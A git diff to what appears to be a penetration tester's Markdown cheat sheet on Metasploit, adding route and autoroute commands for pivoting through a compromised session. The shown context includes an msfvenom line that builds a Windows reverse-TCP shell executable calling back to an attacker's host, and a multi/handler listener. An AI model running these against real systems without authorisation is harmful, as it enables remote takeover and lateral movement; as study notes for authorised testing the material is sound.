@@ -11,7 +11,6 @@ msfvenom -p windows/x64/$SHELL/reverse_tcp -f exe -o shell.exe LHOST=$IP LPORT=$
 Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
 ```msfconsole
 use multi/handler
-set payload windows/meterpreter/reverse_tcp
 set LHOST $LISTENING-IP
 set LPORT $LISTENING-PORT
 exploit
@@ -23,11 +22,28 @@ exploit
 ```msfconsole
 use post/multi/manage/autoroute
 set SESSION 1
+set netmask /CIDR
 set subnet $IP
 exploit
 ```
 
-## Setting up Proxy with Metasploit
+Configuration, [reference](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
+```msfconsole
+route # display the active routes
+route add <IP ADDRESS OF SUBNET> <NETMASK> <GATEWAY
+	  remove
+	  flush	# remove all routes from routing table
+```
+
+To change the autoroute from one route to another
+```msfconsole
+route remove IP/CIDR SESSIONID
+route add IP/CIDR SESSIONID
+route get
+
+```
+
+# Setting up Proxy with Metasploit
 
 Note: Depending on what version of Metasploit you are using, the Proxy Server module will be different. 
 MSF5 and lower will have auxiliary/server/socks4a or socks5, MSF6 and newer will have socks/auxiliary/socks\_proxy. 
